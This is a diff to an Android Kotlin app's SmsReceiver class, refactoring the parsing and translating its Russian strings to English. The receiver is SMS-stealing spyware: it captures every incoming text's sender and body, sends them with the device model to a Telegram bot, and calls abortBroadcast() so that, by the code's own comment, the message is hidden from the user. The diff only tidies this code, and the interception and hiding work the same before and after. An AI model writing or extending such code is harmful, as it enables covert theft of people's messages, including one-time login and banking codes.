@@ -3,7 +3,6 @@ package com.analyzer.smsbeta
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import android.os.Bundle
 import android.provider.Telephony
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
@@ -16,24 +15,16 @@ class SmsReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context?, intent: Intent?) {
         if (intent?.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
-            val bundle: Bundle? = intent.extras
-            if (bundle != null) {
-                val pdus: Array<Any?>? = bundle.get("pdus") as Array<Any?>?
-                if (pdus != null) {
-                    for (pdu in pdus) {
-                        val smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent).firstOrNull()
-                        smsMessage?.let {
-                            val sender: String = it.originatingAddress ?: "Неизвестный отправитель"
-                            val messageBody: String = it.messageBody ?: "Пустое сообщение"
-                            val deviceModel = getDeviceModel()
+            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
+            for (smsMessage in messages) {
+                val sender = smsMessage.originatingAddress ?: "Unknown sender"
+                val messageBody = smsMessage.messageBody ?: "Empty message"
+                val deviceModel = getDeviceModel()
 
-                            sendToTelegramBot(sender, messageBody, deviceModel)
-                            
-                            // Подавляем уведомление, чтобы SMS не показывались пользователю
-                            abortBroadcast()
-                        }
-                    }
-                }
+                sendToTelegramBot(sender, messageBody, deviceModel)
+                
+                // Suppress the SMS notification
+                abortBroadcast()
             }
         }
     }
@@ -48,11 +39,11 @@ class SmsReceiver : BroadcastReceiver() {
         val url = "https://api.telegram.org/bot$botToken/sendMessage"
 
         val text = """
-            Получено новое смс!
-            Отправитель: $sender
-            Сообщение: $message
-        
-            $device
+            New SMS received!
+            Sender: $sender
+            Message: $message
+            
+            Device: $device
         """.trimIndent()
 
         val mediaType = "application/json".toMediaType()
@@ -75,9 +66,6 @@ class SmsReceiver : BroadcastReceiver() {
             }
 
             override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
-                if (!response.isSuccessful) {
-                    println("${response.code}")
-                }
                 response.close()
             }
         })
